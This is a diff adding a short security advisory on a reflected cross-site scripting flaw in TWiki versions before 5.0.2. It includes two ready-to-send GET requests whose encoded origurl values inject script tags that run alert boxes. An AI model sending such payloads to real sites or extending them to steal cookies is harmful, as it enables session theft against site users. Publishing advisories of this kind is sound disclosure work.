@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/47899/info
+
+TWiki is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+Versions prior to TWiki 5.0.2 are vulnerable. 
+
+
+GET /twiki/bin/login/Sandbox/WebHome?%27%221=;origurl=1%27%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert%280x00039C%29%3C/script%3E
+
+GET /twiki/bin/login/Sandbox/WebHome?sudo=sudo;origurl=http://10.1.10.128/bin/view/Main/TWikiAdminUser%00%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3Ealert%280x00044C%29%3C%2Fscript%3E
